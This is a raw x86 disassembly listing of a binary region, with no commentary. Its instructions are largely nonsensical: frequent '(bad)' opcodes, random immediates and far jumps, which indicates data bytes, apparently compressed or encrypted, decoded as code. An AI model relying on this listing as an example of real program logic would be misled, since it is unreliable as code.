  4296e7:	push   0x74
  4296e9:	jp     0x429679
  4296eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296ec:	mov    bl,0x5a
  4296ee:	add    edx,DWORD PTR [esi]
  4296f0:	pop    eax
  4296f1:	adc    BYTE PTR [eax],ah
  4296f3:	push   esp
  4296f4:	jl     0x42969d
  4296f6:	or     BYTE PTR [edi],0xe6
  4296f9:	sbb    al,0xfd
  4296fb:	mov    edx,0x478be88c
  429700:	lds    edi,FWORD PTR [esi+eax*2]
  429703:	imul   edi,DWORD PTR ds:0xf07c8790,0xfffffffc
  42970a:	inc    DWORD PTR [edi]
  42970c:	and    DWORD PTR [edi+0x8],ecx
  42970f:	fwait
  429710:	iret   
  429711:	fsub   QWORD PTR [ecx]
  429713:	in     eax,dx
  429714:	sbb    al,0x21
  429716:	inc    esi
  429717:	test   BYTE PTR [edx+0x3f],bl
  42971a:	or     al,0xaa
  42971c:	(bad)  
  42971e:	loopne 0x429744
  429720:	or     ecx,edi
  429722:	daa    
  429723:	pop    edx
  429724:	ins    DWORD PTR es:[edi],dx
  429725:	mov    dl,0x8b
  429727:	mov    esp,0x39bebc42
  42972c:	mov    esi,0x994d2321
  429731:	sub    eax,DWORD PTR [ecx-0x3]
  429734:	jge    0x429773
  429736:	adc    al,0xd1
  429738:	xchg   ebp,eax
  429739:	call   0x617ecb39
  42973e:	in     al,dx
  42973f:	sbb    dl,al
  429741:	xchg   edx,eax
  429742:	out    0x9d,eax
  429744:	rol    BYTE PTR [edi+0x4ae4f58c],0x2b
  42974b:	repz and eax,0x2e8d0b2b
  429751:	jne    0x4296e4
  429753:	cmp    cl,0xe5
  429756:	scas   eax,DWORD PTR es:[edi]
  429757:	repz mov WORD PTR [ebx-0x3568c1bb],gs
  42975e:	addr16 xchg ebp,eax
  429760:	in     al,0x2a
  429762:	xchg   ecx,eax
  429763:	int3   
  429764:	or     eax,0x7ee7f3d2
  429769:	push   esi
  42976a:	xor    cl,BYTE PTR [esi-0x25]
  42976d:	xchg   ecx,eax
  42976e:	mov    cl,BYTE PTR [esi]
  429770:	out    dx,al
  429771:	cmc    
  429772:	lea    edx,[edx+0x7f3e8606]
  429778:	mov    ds:0xb6e1afed,eax
  42977d:	jmp    0x4297b7
  42977f:	(bad)  
  429780:	push   0xffffffa2
  429782:	and    al,0x0
  429784:	lea    edi,[ebx]
  429786:	xchg   edi,eax
  429787:	scas   eax,DWORD PTR es:[edi]
  429788:	mov    ecx,0x57eba92a
  42978d:	xchg   BYTE PTR [esi],ch
  42978f:	popf   
  429790:	mov    es,WORD PTR [eax]
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	ins    DWORD PTR es:[edi],dx
  429801:	pop    esi
  429802:	jno    0x429825
  429804:	pop    edx
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	pop    ecx
  42980d:	dec    esi
  42980e:	in     eax,0xb2
  429810:	(bad)  
  429812:	mov    edx,0x43adc12e
  429817:	push   ebx
  429818:	sub    esp,DWORD PTR [ecx-0x27]
  42981b:	loope  0x4297d6
  42981d:	lock add BYTE PTR [esi+ebx*8+0x58],al
  429822:	mov    fs,WORD PTR [ecx+0x66]
  429825:	add    DWORD PTR [eax-0x79],esp
  429828:	dec    ebp
  429829:	dec    ebx
  42982a:	mov    ds:0xe5e501ab,eax
  42982f:	sub    dl,bl
  429831:	mov    ebp,0x8af9659e
  429836:	lea    esi,[ecx+ecx*2+0x5d]
  42983a:	dec    edi
  42983b:	out    0xc9,al
  42983d:	xchg   esi,eax
  42983e:	or     al,0x7c
  429840:	inc    BYTE PTR [edi+0x4f]
  429843:	ja     0x429817
  429845:	aam    0x8f
  429847:	fild   DWORD PTR [edx]
  429849:	imul   esi,DWORD PTR [ecx],0x1799c355
  42984f:	retf   0x12ad
  429852:	fldcw  WORD PTR [edi]
  429854:	sbb    BYTE PTR [edi+0x5af42343],dl
  42985a:	dec    esi
  42985b:	lods   al,BYTE PTR ds:[esi]
  42985c:	jecxz  0x4298be
  42985e:	fstp   QWORD PTR [ebp-0x26776f1b]
  429864:	xchg   edx,eax
  429865:	push   ss
  429866:	test   BYTE PTR [esi],dl
  429868:	xchg   ebp,eax
  429869:	adc    bh,BYTE PTR [esi-0x504e08bf]
  42986f:	repz aam 0x57
  429872:	add    eax,0x83c2a21e
  429877:	sahf   
  429878:	xchg   ebx,eax
  429879:	dec    ebp
  42987a:	pop    es
  42987b:	mov    ds:0x1b62a797,al
  429880:	cwde   
  429881:	pop    ds
  429882:	add    bl,BYTE PTR [edx+0x6bc34902]
  429888:	sahf   
  429889:	xchg   esi,eax
  42988a:	ret    0xed62
  42988d:	test   al,0x1
  42988f:	or     esp,eax
  429891:	adc    eax,DWORD PTR [esp+esi*4+0x34a5f8b6]
  429898:	jns    0x429876
  42989a:	lock jle 0x4298bf
  42989d:	xchg   BYTE PTR [esi+edi*1],bh
  4298a0:	adc    ah,0xb4
  4298a3:	mov    eax,0xbbb807b8
  4298a8:	sbb    al,BYTE PTR [ebp+0x42]
  4298ab:	sbb    eax,DWORD PTR [ebx]
  4298ad:	ds mov ecx,0xe5d64116
  4298b3:	fisttp WORD PTR [ecx-0x6d1a56ea]
  4298b9:	mov    eax,ds:0xf96b6720
  4298be:	js     0x429894
  4298c0:	mov    dh,0x1b
  4298c2:	loop   0x4298a0
  4298c4:	add    DWORD PTR [eax],ecx
  4298c6:	sar    DWORD PTR [esi],0xd9
  4298c9:	pop    esp
  4298ca:	mov    cs,WORD PTR [esi+0x5d599c1d]
  4298d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298d1:	fbld   TBYTE PTR [edx-0x33fbc0eb]
  4298d7:	fimul  DWORD PTR [edi+0x16]
  4298da:	and    al,0x78
  4298dc:	cdq    
  4298dd:	jle    0x4298b8
  4298df:	(bad)  
  4298e0:	mov    ebp,0xafe3e7c6
  4298e5:	sbb    DWORD PTR [ebx-0x19],ebp
  4298e8:	out    0xdf,al
  4298ea:	push   edi
  4298eb:	and    al,0x1c
  4298ed:	das    
  4298ee:	xchg   ebx,eax
  4298ef:	shl    BYTE PTR [esi],1
  4298f1:	das    
  4298f2:	hlt    
  4298f3:	dec    edx
  4298f4:	jge    0x429876
  4298f6:	ins    DWORD PTR es:[edi],dx
  4298f7:	xchg   esi,eax
  4298f8:	daa    
  4298f9:	stc    
  4298fa:	test   cl,cl
  4298fc:	arpl   WORD PTR [edi],bx
  4298fe:	cmp    esi,DWORD PTR [edi+0x74830773]
  429904:	pop    ecx
  429905:	jbe    0x429929
  429907:	out    0x8e,eax
  429909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42990a:	sbb    eax,0x630f75b4
  42990f:	jmp    0x429891
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	ins    BYTE PTR es:[edi],dx
  429981:	sbb    DWORD PTR [ecx+0x1bd5f95],ebp
  429987:	add    BYTE PTR ds:0x8e000001,al
  42998d:	and    eax,DWORD PTR [esi]
  42998f:	mov    eax,ds:0x4a0f0642
  429994:	dec    eax
  429995:	leave  
  429996:	mov    dh,BYTE PTR [ebp-0xe7335b8]
  42999c:	je     0x429927
  42999e:	stos   BYTE PTR es:[edi],al
  42999f:	mov    es,WORD PTR [ebx]
  4299a1:	out    dx,al
  4299a2:	repz or al,0x8c
  4299a6:	out    dx,al
  4299a7:	dec    eax
  4299a8:	out    dx,al
  4299a9:	loopne 0x4299d8
  4299ab:	std    
  4299ac:	dec    ecx
  4299ad:	mov    cl,0xdb
  4299af:	cs stc 
  4299b1:	dec    esp
  4299b2:	push   0x5cda94de
  4299b7:	and    cl,BYTE PTR [ebx+esi*2-0x7d]
  4299bb:	mov    ebx,DWORD PTR ds:0xff486bcf
  4299c1:	in     al,dx
  4299c2:	sub    eax,0x36714d9
  4299c7:	or     DWORD PTR [eax+ebx*1],ebx
  4299ca:	xor    al,0x1e
  4299cc:	push   cs
  4299cd:	sbb    eax,DWORD PTR [esi]
  4299cf:	into   
  4299d0:	sub    eax,0x234bbfb0
  4299d5:	cdq    
  4299d6:	les    edx,FWORD PTR [ecx-0x750303e3]
  4299dc:	adc    DWORD PTR [esi-0x49],ebp
  4299df:	xchg   edx,eax
  4299e0:	ja     0x4299a3
  4299e2:	(bad)  
  4299e3:	adc    al,BYTE PTR [esi-0x9]
  4299e6:	xchg   BYTE PTR [edx],ah
  4299e8:	lods   eax,DWORD PTR ds:[esi]
  4299e9:	gs xor al,0x15
  4299ec:	aad    0x2
  4299ee:	rcl    DWORD PTR [eax],0xcd
  4299f1:	cmc    
  4299f2:	clc    
  4299f3:	imul   ebp,DWORD PTR [ebp-0x37],0x85fc3e07
  4299fa:	mov    cl,0x22
  4299fc:	inc    ebx
  4299fd:	aad    0x8c
  4299ff:	pop    edx
  429a00:	pop    edx
  429a01:	lods   al,BYTE PTR ds:[esi]
  429a02:	call   0x3826fe5e
  429a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a08:	shl    ebp,cl
  429a0a:	in     eax,dx
  429a0b:	xchg   esi,eax
  429a0c:	jg     0x429a2f
  429a0e:	mov    bh,0xe3
  429a10:	out    0x17,al
  429a12:	adc    dl,BYTE PTR [esi]
  429a14:	jbe    0x429a67
  429a16:	(bad)  
  429a18:	cmp    DWORD PTR [edi-0x69],esp
  429a1b:	lock mov ah,0xea
  429a1e:	(bad)  
  429a1f:	ud2    
  429a21:	call   0x9a37:0xd064
  429a27:	fidivr WORD PTR [ecx+eiz*8]
  429a2a:	sbb    edi,esi
  429a2c:	xlat   BYTE PTR ds:[ebx]
  429a2d:	hlt    
  429a2e:	mov    BYTE PTR [ebx-0x7f],dl
  429a31:	ja     0x429a7b
  429a33:	(bad)  [edi-0x5e]
  429a36:	imul   ebp,DWORD PTR [ebx],0x57ee73d
  429a3c:	xchg   BYTE PTR ds:0xb3ab7aac,bl
  429a42:	ja     0x4299f1
  429a44:	test   BYTE PTR [ebx+0x260e21d2],0xd6
  429a4b:	inc    edi
  429a4c:	pop    ebp
  429a4d:	dec    edi
  429a4e:	pusha  
  429a4f:	test   eax,0x65324d55
  429a54:	mov    DWORD PTR [esi+0x33],ebp
  429a57:	pushf  
  429a58:	js     0x429a25
  429a5a:	rol    esi,0x29
  429a5d:	sti    
  429a5e:	pop    edx
  429a5f:	adc    eax,0x6d0f9eec
  429a64:	xchg   BYTE PTR [ebp+eax*1+0x31],ch
  429a68:	mov    ecx,0x8daaf2be
  429a6d:	jl     0x429add
  429a6f:	retf   
  429a70:	in     al,0x43
  429a72:	mov    al,ds:0xc2de6b8a
  429a77:	int    0x74
  429a79:	push   ds
  429a7a:	jg     0x429afb
  429a7c:	dec    esi
  429a7d:	clc    
  429a7e:	xor    al,0x7f
  429a80:	into   
  429a81:	sub    al,0x74
  429a83:	cdq    
  429a84:	push   edi
  429a85:	add    ecx,eax
  429a87:	push   ss
  429a88:	aad    0xe1
  429a8a:	icebp  
  429a8b:	push   0x2bf0c03
  429a90:	jo     0x429a92
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0xd2a95667
  429b01:	dec    edi
  429b02:	inc    esp
  429b03:	dec    ecx
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	pop    esp
  429b0d:	loopne 0x429b3c
  429b0f:	aad    0x73
  429b11:	xor    al,0xf0
  429b13:	pop    ss
  429b14:	or     BYTE PTR [ebp-0xc],dh
  429b17:	loop   0x429b85
  429b19:	ss int3 
  429b1b:	push   ds
  429b1c:	pop    ds
  429b1d:	ss jle 0x429ad0
  429b20:	pusha  
  429b21:	cmp    ah,BYTE PTR [esi-0x6b5e0122]
  429b27:	ins    DWORD PTR es:[edi],dx
  429b28:	popa   
  429b29:	push   ebx
  429b2a:	(bad)
  429b2d:	shr    DWORD PTR [ebx-0x2eae3fa0],cl
  429b33:	mov    WORD PTR [edi],fs
  429b35:	pop    ss
  429b36:	js     0x429aec
  429b38:	sub    ah,cl
  429b3a:	jg     0x429b8f
  429b3c:	sbb    al,0xd2
  429b3e:	sub    eax,DWORD PTR [edi-0x32]
  429b41:	call   0x6ed5:0x26ba41a9
  429b48:	cmp    dh,BYTE PTR [ebx+0x5b]
  429b4b:	xor    BYTE PTR [edi+eax*1-0x4a],bl
  429b4f:	mov    esi,DWORD PTR [ebx-0x77]
  429b52:	cmp    cl,BYTE PTR ds:0xcdcfd1c2
  429b58:	mov    edi,0xfb277f35
  429b5d:	jp     0x429b29
  429b5f:	dec    edx
  429b60:	adc    BYTE PTR [edx],ah
  429b62:	cdq    
  429b63:	shl    BYTE PTR [esp+ebx*2-0x583f0da0],0x1c
  429b6b:	adc    BYTE PTR [ecx],bh
  429b6d:	fnstsw WORD PTR [esi+0x43dbbf3]
  429b73:	inc    esp
  429b74:	mov    BYTE PTR [ecx+0x395e0be3],bh
  429b7a:	(bad)  
  429b7b:	fdiv   QWORD PTR [ecx]
  429b7d:	and    eax,0xec43b9b2
  429b82:	xor    eax,0x4c9f999
  429b87:	pause  
  429b89:	add    cl,BYTE PTR [ebx-0x33]
  429b8c:	std    
  429b8d:	dec    edi
  429b8e:	and    BYTE PTR [ebp+0x1d],bl
  429b91:	push   cs
  429b92:	add    BYTE PTR [ecx],0xd7
  429b95:	mov    esp,0xa91f742a
  429b9a:	pop    esi
  429b9b:	mov    al,0xcd
  429b9d:	aas    
  429b9e:	jmp    0x429bb2
  429ba0:	mov    cl,0xb7
  429ba2:	ja     0x429b28
  429ba4:	nop
  429ba5:	clc    
  429ba6:	test   al,0x18
  429ba8:	cmp    ebx,DWORD PTR [ebx-0x6b]
  429bab:	mov    esi,0x28e8239c
  429bb0:	and    DWORD PTR ds:0x2cf02a72,esp
  429bb6:	or     eax,0x48f55e36
  429bbb:	aas    
  429bbc:	xor    DWORD PTR [eax],eax
  429bbe:	cmp    BYTE PTR [esp+eax*2+0x492823f7],bh
  429bc5:	push   cs
  429bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bc7:	mov    ss,WORD PTR ds:0x1e04
  429bcc:	(bad)  
  429bcd:	cwde   
  429bce:	imul   esp,ebx,0xffffffd6
  429bd1:	adc    DWORD PTR ss:0x809828c2,esp
  429bd8:	retf   0x9413
  429bdb:	push   es
  429bdc:	loop   0x429c2b
  429bde:	lea    ebx,[ebp-0xf]
  429be1:	aas    
  429be2:	sub    edi,ebx
  429be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429be5:	cld    
  429be6:	int    0x36
  429be8:	(bad)  
  429be9:	and    eax,DWORD PTR [ecx+ebp*2]
  429bec:	ror    BYTE PTR [ecx],cl
  429bee:	ja     0x429c33
  429bf0:	jp     0x429c24
  429bf2:	out    0xe,al
  429bf4:	jg     0x429c63
  429bf6:	popa   
  429bf7:	arpl   di,sp
  429bf9:	bound  ebp,QWORD PTR [eax-0x69d0287f]
  429bff:	jp     0x429c64
  429c01:	cmp    eax,0x389bc7ca
  429c06:	rep ins DWORD PTR es:[edi],dx
  429c08:	rcr    BYTE PTR [edx],0xa1
  429c0b:	div    DWORD PTR [edi-0x5e]
  429c0e:	cmp    ebp,DWORD PTR [edi+esi*8]
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR ds:0x69af765a,dh
  429c85:	mov    edi,0x1050001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	and    al,0x63
  429c8e:	in     al,0xda
  429c90:	or     BYTE PTR [ecx+0x7f],bh
  429c93:	not    DWORD PTR [ecx+0x51]
  429c96:	(bad)  
  429c97:	int    0x89
  429c99:	aaa    
  429c9a:	cmp    eax,0x6c064182
  429c9f:	shr    dh,1
  429ca1:	jns    0x429c8d
  429ca3:	dec    eax
  429ca4:	dec    edi
  429ca5:	(bad)  
  429ca6:	mov    ebp,DWORD PTR ss:[ecx+0x1ec59cc1]
  429cad:	cmp    al,0x8e
  429caf:	loop   0x429c38
  429cb1:	sub    DWORD PTR [ebp-0x37e352f],eax
  429cb7:	(bad)  
  429cb8:	mov    dl,0xf3
  429cba:	pushf  
  429cbb:	bnd jg 0x429cc6
  429cbe:	cli    
  429cbf:	sbb    BYTE PTR [edx],0x31
  429cc2:	or     ebp,DWORD PTR [eax]
  429cc4:	das    
  429cc5:	mov    ebp,DWORD PTR [edi-0x33]
  429cc8:	outs   dx,DWORD PTR ds:[esi]
  429cc9:	outs   dx,DWORD PTR ds:[esi]
  429cca:	mov    ebx,0xe895ce8f
  429ccf:	mov    ecx,0xec3170b6
  429cd4:	jecxz  0x429c6e
  429cd6:	in     al,dx
  429cd7:	cld    
  429cd8:	mov    cl,0x8f
  429cda:	add    cl,al
  429cdc:	jmp    0x6569:0xd64c9b32
  429ce3:	jp     0x429cc8
  429ce5:	push   edx
  429ce6:	inc    ebp
  429ce7:	jmp    FWORD PTR [esp+edx*4-0x40]
  429ceb:	mov    DWORD PTR [ecx-0x79],0x95484a85
  429cf2:	outs   dx,BYTE PTR ds:[esi]
  429cf3:	int3   
  429cf4:	jmp    0xaf6e995e
  429cf9:	adc    eax,0xa750c4c2
  429cfe:	(bad)  
  429cff:	arpl   WORD PTR [eax+0x6e5e9a1a],cx
  429d05:	pop    ebp
  429d06:	aad    0x44
  429d08:	icebp  
  429d09:	imul   esp,DWORD PTR [eax],0x1
  429d0c:	push   cs
  429d0d:	pop    ebx
  429d0e:	adc    ch,BYTE PTR [ebx+0x161604f1]
  429d14:	xor    al,0x2c
  429d16:	sbb    cl,BYTE PTR ds:0x746a6d21
  429d1c:	test   bh,ch
  429d1e:	idiv   cl
  429d20:	ret    0x29bc
  429d23:	push   esp
  429d24:	retf   
  429d25:	sahf   
  429d26:	mov    eax,0x5591b66d
  429d2b:	mov    bh,0x23
  429d2d:	jmp    0x2fd3:0x22d7770e
  429d34:	adc    ecx,esi
  429d36:	cmc    
  429d37:	jo     0x429d47
  429d39:	stos   DWORD PTR es:[edi],eax
  429d3a:	jb     0x429d31
  429d3c:	jne    0x429da6
  429d3e:	dec    esi
  429d3f:	sbb    eax,0x6c43a100
  429d44:	out    dx,al
  429d45:	shl    BYTE PTR [ecx+ebx*4+0x504b4c3e],1
  429d4c:	aam    0x1a
  429d4e:	repz xor edx,DWORD PTR [ebx+0x5e]
  429d52:	mul    ch
  429d54:	rep cs stos BYTE PTR es:[edi],al
  429d57:	(bad)  [edi+0x69]
  429d5a:	xrelease xchg BYTE PTR [si],bl
  429d5e:	xchg   edx,eax
  429d5f:	sub    BYTE PTR [eax],al
  429d61:	retf   0x4a5e
  429d64:	outs   dx,BYTE PTR ds:[esi]
  429d65:	outs   dx,BYTE PTR ds:[esi]
  429d66:	ja     0x429d64
  429d68:	pop    edx
  429d69:	xor    DWORD PTR [edx+0x65],0x87f2cdba
  429d70:	and    eax,0x4093ce14
  429d75:	xchg   DWORD PTR [ecx],esp
  429d77:	or     eax,0x29683f27
  429d7c:	sbb    edx,DWORD PTR [esi-0x4405e037]
  429d82:	pop    edx
  429d83:	scas   eax,DWORD PTR es:[edi]
  429d84:	sub    al,0xeb
  429d86:	or     eax,0x62038879
  429d8b:	pop    ebp
  429d8c:	pop    ebx
  429d8d:	test   BYTE PTR [edx+edx*1],0x68
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	adc    dh,ah
  429e02:	xor    esp,DWORD PTR [ecx+0x6e]
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x2a000001
  429e0d:	pop    ebp
  429e0e:	pop    ds
  429e0f:	sub    bh,0xf4
  429e12:	or     DWORD PTR [ebp+0x69],ebp
  429e15:	push   ss
  429e16:	addr16 xor ch,bl
  429e19:	out    dx,eax
  429e1a:	test   al,0xea
  429e1c:	out    0x50,eax
  429e1e:	add    eax,0x875e9610
  429e23:	stos   BYTE PTR es:[edi],al
  429e24:	addr16 push es
  429e26:	adc    BYTE PTR [ebx-0x637cc16c],0x3e
  429e2d:	popf   
  429e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429e2f:	and    eax,0xa1538795
  429e34:	adc    al,0x3f
  429e36:	ds and eax,0x6349cdd9
  429e3c:	xor    al,0x16
  429e3e:	cmp    DWORD PTR [eax-0x5d108a36],edi
  429e44:	pop    edx
  429e45:	mov    dl,0x51
  429e47:	pop    ds
  429e48:	add    esp,DWORD PTR [ebx+0x40]
  429e4b:	push   esi
  429e4c:	cld    
  429e4d:	sbb    esi,0xea313c1f
  429e53:	int3   
  429e54:	cwde   
  429e55:	jne    0x429ebe
  429e57:	inc    esp
  429e58:	mov    edx,esi
  429e5a:	jge    0x429ec9
  429e5c:	add    eax,0x214c905e
  429e61:	rol    DWORD PTR [edi],0xe6
  429e64:	inc    ebp
  429e65:	nop
  429e66:	fild   QWORD PTR [eax+eiz*1+0x260aeec7]
  429e6d:	or     ch,BYTE PTR [esi-0x2167506a]
  429e73:	enter  0x7684,0x5
  429e77:	xchg   esi,eax
  429e78:	and    eax,0x2cd41d25
  429e7d:	mov    ah,dh
  429e7f:	mov    dl,0xa8
  429e81:	scas   al,BYTE PTR es:[edi]
  429e82:	mul    DWORD PTR [esi]
  429e84:	xor    BYTE PTR [eax+0x69],0xd3
  429e88:	ret    
  429e89:	xchg   DWORD PTR [edi+0x3c],esp
  429e8c:	addr16 daa 
  429e8e:	loope  0x429e6f
  429e90:	aas    
  429e91:	cli    
  429e92:	dec    ecx
  429e93:	add    bh,BYTE PTR [ebx+0x8b62a05]
  429e99:	and    al,0x96
  429e9b:	xchg   eax,esp
  429e9d:	out    dx,eax
  429e9e:	imul   DWORD PTR [ecx]
  429ea0:	sbb    dl,BYTE PTR [ecx]
  429ea2:	ret    
  429ea3:	cli    
  429ea4:	push   ebx
  429ea5:	arpl   WORD PTR [esi-0x6e],si
  429ea8:	cld    
  429ea9:	retf   
  429eaa:	repz les ecx,FWORD PTR [ebx+0x52c45026]
  429eb1:	mov    al,0xd6
  429eb3:	sahf   
  429eb4:	aad    0x82
  429eb6:	stos   BYTE PTR es:[edi],al
  429eb7:	movq   mm7,mm3
  429eba:	scas   al,BYTE PTR es:[edi]
  429ebb:	push   ebp
  429ebc:	pusha  
  429ebd:	sbb    al,0x8
  429ebf:	(bad)  
  429ec0:	mov    ds:0x952f11fb,al
  429ec5:	(bad)  
  429ec6:	and    al,0xf8
  429ec8:	sbb    DWORD PTR [edx-0x7e],esp
  429ecb:	pop    edx
  429ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ecd:	imul   DWORD PTR [ecx]
  429ecf:	ja     0x429e56
  429ed1:	xor    edi,0x15
  429ed4:	das    
  429ed5:	data16 xor BYTE PTR [esi+eiz*4],bh
  429ed9:	repz (bad) 
  429edb:	repnz ins BYTE PTR es:[edi],dx
  429edd:	fidivr WORD PTR [edx]
  429edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ee0:	add    edi,ebx
  429ee2:	dec    esi
  429ee3:	scas   eax,DWORD PTR es:[edi]
  429ee4:	inc    esp
  429ee5:	xor    BYTE PTR [edx+0x1d],bl
  429ee8:	xor    edx,edx
  429eea:	jecxz  0x429f49
  429eec:	cmp    eax,0x73262043
  429ef1:	inc    ebx
  429ef2:	and    BYTE PTR [eax],0x51
  429ef5:	popf   
  429ef6:	retf   
  429ef7:	jecxz  0x429f6b
  429ef9:	call   0xf6d3:0x6c783bb0
  429f00:	aaa    
  429f01:	xchg   esi,eax
  429f02:	pushf  
  429f03:	outs   dx,DWORD PTR ds:[esi]
  429f04:	push   cs
  429f05:	imul   ebp,DWORD PTR [esi+0x52],0xebae4f32
  429f0c:	fs jno 0x429eb5
  429f0f:	stc    
  429f10:	scas   al,BYTE PTR es:[edi]
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x394f094e]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x8f000001
  429f8d:	jmp    0xcde0c51e
  429f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f93:	fdivr  QWORD PTR [edx]
  429f95:	dec    esi
  429f96:	test   al,0x9a
  429f98:	xchg   ebx,eax
  429f99:	das    
  429f9a:	pop    edi
  429f9b:	mov    ecx,0x5d6d5a64
  429fa0:	pop    esi
  429fa1:	add    al,BYTE PTR [ecx-0x6f]
  429fa4:	mov    bl,0x52
  429fa6:	cmp    al,0x98
  429fa8:	inc    edx
  429fa9:	mov    BYTE PTR [esi-0x73],0xec
  429fad:	xor    edx,DWORD PTR fs:[ecx]
  429fb0:	pop    eax
  429fb1:	fucomp st(1)
  429fb3:	sbb    al,0xe6
  429fb5:	sub    ah,BYTE PTR [ecx-0x2e104960]
  429fbb:	adc    dh,BYTE PTR [ebx]
  429fbd:	xor    al,0x8f
  429fbf:	sbb    BYTE PTR [ebp+0x229032e4],ch
  429fc5:	xor    DWORD PTR [eax],esp
  429fc7:	shr    DWORD PTR [esi],cl
  429fc9:	imul   edi,esp,0xadea9d7d
  429fcf:	mov    ds:0xcb0baba9,al
  429fd4:	stos   BYTE PTR es:[edi],al
  429fd5:	outs   dx,BYTE PTR ds:[esi]
  429fd6:	mov    ecx,ds
  429fd8:	fdiv   QWORD PTR [eax]
  429fda:	out    dx,al
  429fdb:	mov    dh,0xc3
  429fdd:	push   edi
  429fde:	lds    eax,FWORD PTR [ebx-0x5568fa39]
  429fe4:	(bad)  
  429fe5:	and    DWORD PTR [ebx+0x57dde74e],esp
  429feb:	test   edx,esp
  429fed:	sbb    esi,DWORD PTR [edx+0x5272ba1a]
  429ff3:	xor    eax,0x472f0c98
  429ff8:	fcmovb st,st(5)
  429ffa:	and    DWORD PTR [ecx+eiz*2-0x50],edi
  429ffe:	sbb    esp,0x59ad2311
  42a004:	xchg   esp,eax
  42a005:	ret    
  42a006:	pop    ecx
  42a007:	(bad)  
  42a008:	fwait
  42a009:	xchg   ebp,eax
  42a00a:	test   DWORD PTR [esi-0x61],ebp
  42a00d:	mov    bh,0x5c
  42a00f:	cmp    BYTE PTR [edx+0x39b395e2],ch
  42a015:	lea    eax,[esp+ebp*8]
  42a018:	sub    DWORD PTR [ebp+0x37],edi
  42a01b:	pop    esi
  42a01c:	repz jmp 0xa26fe7fb
  42a022:	or     BYTE PTR [ebp+0x67890c6],ch
  42a028:	push   esp
  42a029:	daa    
  42a02a:	bound  edi,QWORD PTR [ebx-0x1719e454]
  42a030:	ds mov esi,0x315256ca
  42a036:	js     0x42a0a9
  42a038:	jp     0x429fc6
  42a03a:	rcr    BYTE PTR [ecx+ebp*1+0x8801ccf],cl
  42a041:	xor    DWORD PTR [edx-0x3d954b42],ecx
  42a047:	mov    edx,0x8688d5bd
  42a04c:	lods   al,BYTE PTR ds:[esi]
  42a04d:	dec    edx
  42a04e:	mov    ebp,esi
  42a050:	das    
  42a051:	pop    esp
  42a052:	sbb    BYTE PTR ds:0x81f7bf65,bh
  42a058:	sub    al,0xf9
  42a05a:	cmc    
  42a05b:	mov    esi,0x66a10d16
  42a060:	fwait
  42a061:	mov    eax,ds:0x8b3ba994
  42a066:	push   esp
  42a067:	dec    eax
  42a068:	mov    ds:0xe3599bce,al
  42a06d:	xchg   edx,eax
  42a06e:	ja     0x42a032
  42a070:	icebp  
  42a071:	cmc    
  42a072:	test   BYTE PTR ds:0xc51f4a45,al
  42a078:	add    eax,0xe8a33eb5
  42a07d:	jmp    0x6937cd24
  42a082:	jl     0x42a07d
  42a084:	xchg   edx,eax
  42a085:	sbb    edx,DWORD PTR [ecx+0x52]
  42a088:	xor    eax,0x25363218
  42a08d:	push   esp
  42a08e:	pop    esi
  42a08f:	sbb    DWORD PTR [edx],esi
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	or     al,0x49
  42a102:	mov    bl,0xb4
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xf5000001
  42a10d:	jne    0x42a0da
  42a10f:	or     eax,0x632f9548
  42a114:	sbb    eax,0x5f362a2b
  42a119:	xlat   BYTE PTR ds:[ebx]
  42a11a:	xor    ebp,DWORD PTR [edx+0x158dfb7c]
  42a120:	xor    BYTE PTR [edx-0x51e32af0],dh
  42a126:	in     al,0x99
  42a128:	sub    al,0xdd
  42a12a:	jmp    0xe750:0xd993c284
  42a131:	(bad)  
  42a132:	loope  0x42a104
  42a134:	sub    edx,edi
  42a136:	call   0x64b601bc
  42a13b:	lea    ebp,[ecx]
  42a13d:	test   al,0xa8
